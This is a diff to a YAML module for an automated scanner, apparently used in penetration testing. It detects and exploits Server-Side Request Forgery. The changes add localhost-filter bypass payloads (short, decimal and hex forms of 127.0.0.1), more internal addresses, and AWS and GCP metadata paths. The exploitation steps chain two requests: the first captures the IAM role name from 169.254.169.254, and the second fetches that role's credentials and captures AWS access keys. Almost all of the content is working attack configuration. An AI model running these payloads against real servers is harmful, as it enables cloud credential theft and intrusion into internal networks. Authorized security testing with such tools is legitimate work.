@@ -4,12 +4,19 @@
 id: web_ssrf
 name: Server-Side Request Forgery
 category: web
-version: "1.0"
+version: "1.1"
 author: system
 description: >
   Detects and exploits SSRF vulnerabilities where the server makes outbound
   requests based on user input. Targets cloud metadata services, internal
   services, and localhost access to extract credentials and sensitive data.
+
+tags:
+  - ssrf
+  - cloud
+  - metadata
+  - internal-network
+estimated_duration_seconds: 30
 
 # ============================================================
 # Guard
@@ -53,13 +60,21 @@ detection_paths:
         action: http_probe
         params:
           inject_into: all_params
+          mutation_families: [param_remove, value_empty]
+          target_selector: all_inputs
+          max_variants: 12
           payloads:
             - 'http://localhost'
             - 'http://127.0.0.1'
+            - 'http://127.1'
+            - 'http://2130706433'
+            - 'http://0x7f000001'
+            - 'http://localhost@127.0.0.1'
             - 'http://0.0.0.0'
             - 'http://[::1]'
         signals:
-          - match: 'localhost|127\.0\.0\.1'
+          - match:
+              condition: "response.status in [200, 301, 302, 403] and re.search(r'localhost|127\\.0\\.0\\.1|127\\.1|2130706433|0x7f000001', response.body, re.I)"
             on_match:
               confidence_boost: 0.35
               emit: ssrf_localhost_confirmed
@@ -78,8 +93,11 @@ detection_paths:
             - 'http://192.168.1.1'
             - 'http://10.0.0.1'
             - 'http://172.16.0.1'
+            - 'http://192.168.0.1'
+            - 'http://10.0.0.2'
         signals:
-          - match: 'private|internal|admin'
+          - match:
+              condition: "response.status in [200, 301, 302, 403] and re.search(r'private|internal|admin|dashboard', response.body, re.I)"
             on_match:
               confidence_boost: 0.30
               emit: ssrf_internal_confirmed
@@ -97,9 +115,12 @@ detection_paths:
           payloads:
             - 'http://169.254.169.254'
             - 'http://169.254.169.254/latest/meta-data/'
+            - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
             - 'http://metadata.google.internal'
+            - 'http://metadata.google.internal/computeMetadata/v1/instance/'
         signals:
-          - match: 'ami-id|instance-id|iam|credentials|metadata'
+          - match:
+              condition: "response.status in [200, 301, 302, 403] and re.search(r'ami-id|instance-id|iam|credentials|metadata|project-id|service-accounts', response.body, re.I)"
             on_match:
               confidence_boost: 0.45
               emit: ssrf_metadata_confirmed
@@ -121,16 +142,14 @@ exploitation_paths:
           payloads:
             - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
         capture:
-          - pattern: '[a-zA-Z0-9_-]+'
+          - pattern: '(?m)^[A-Za-z0-9_.-]{3,64}$'
             as: iam_role_name
       - id: extract_credentials
         action: http_probe
         params:
           inject_into: vulnerable_param
           payloads:
-            - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/Admin'
-            - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/Default'
-            - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role'
+            - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/{{ captures.iam_role_name }}'
         capture:
           - pattern: 'AKIA[0-9A-Z]{16}'
             as: aws_access_key
